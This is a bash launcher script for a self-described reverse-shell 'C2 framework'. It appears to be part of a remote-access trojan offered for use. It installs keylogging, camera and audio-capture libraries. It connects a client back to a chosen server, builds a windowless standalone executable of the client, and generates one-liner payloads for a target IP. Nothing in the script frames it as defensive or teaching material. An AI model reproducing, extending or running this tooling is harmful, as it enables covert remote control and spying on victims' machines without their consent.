#!/bin/bash
# REVERSESHELL Launcher v2.0

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}"
echo "╔════════════════════════════════════════════╗"
echo "║       🐉 REVERSESHELL v2.0                ║"
echo "║       Advanced C2 Framework               ║"
echo "╚════════════════════════════════════════════╝"
echo -e "${NC}"

# Check Python
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Python3 not found!${NC}"
    exit 1
fi

# Check/Setup virtual environment
if [ ! -d "venv" ]; then
    echo -e "${YELLOW}Creating virtual environment...${NC}"
    python3 -m venv venv
fi

source venv/bin/activate

# Check dependencies
echo -e "${YELLOW}Checking dependencies...${NC}"
pip install -q cryptography Pillow pynput opencv-python pyaudio 2>/dev/null

# Show menu
echo -e "${GREEN}[1]${NC} Start Server (GUI)"
echo -e "${GREEN}[2]${NC} Start Client (connect to server)"
echo -e "${GREEN}[3]${NC} Show your IP address"
echo -e "${GREEN}[4]${NC} Create standalone executable"
echo -e "${GREEN}[5]${NC} Generate one-liner payload"
echo -e "${GREEN}[6]${NC} Run quick test"
echo -e "${GREEN}[7]${NC} Install all dependencies"
echo -e "${GREEN}[0]${NC} Exit"
echo ""

read -p "Choose option: " choice

case $choice in
    1)
        echo -e "${GREEN}Starting server...${NC}"
        python3 server.py
        ;;
    2)
        read -p "Server IP (default: 127.0.0.1): " server_ip
        server_ip=${server_ip:-127.0.0.1}
        read -p "Server Port (default: 9999): " server_port
        server_port=${server_port:-9999}
        echo -e "${GREEN}Connecting to ${server_ip}:${server_port}...${NC}"
        python3 client.py $server_ip $server_port
        ;;
    3)
        echo -e "${CYAN}Your IP addresses:${NC}"
        if command -v ip &> /dev/null; then
            ip addr show | grep "inet " | grep -v "127.0.0.1"
        else
            ifconfig | grep "inet " | grep -v "127.0.0.1"
        fi
        ;;
    4)
        echo -e "${YELLOW}Installing PyInstaller...${NC}"
        pip install -q pyinstaller
        echo -e "${YELLOW}Creating executable...${NC}"
        pyinstaller --onefile --noconsole --name reverseshell client.py
        echo -e "${GREEN}Done! Executable: dist/reverseshell${NC}"
        ;;
    5)
        read -p "Target IP: " target_ip
        python3 payload.py one-liner $target_ip
        ;;
    6)
        echo -e "${GREEN}Running quick test...${NC}"
        python3 test.py
        ;;
    7)
        echo -e "${YELLOW}Installing all dependencies...${NC}"
        pip install -r requirements.txt
        echo -e "${GREEN}Done!${NC}"
        ;;
    0)
        echo -e "${GREEN}Goodbye!${NC}"
        exit 0
        ;;
    *)
        echo -e "${RED}Invalid option${NC}"
        ;;
esac
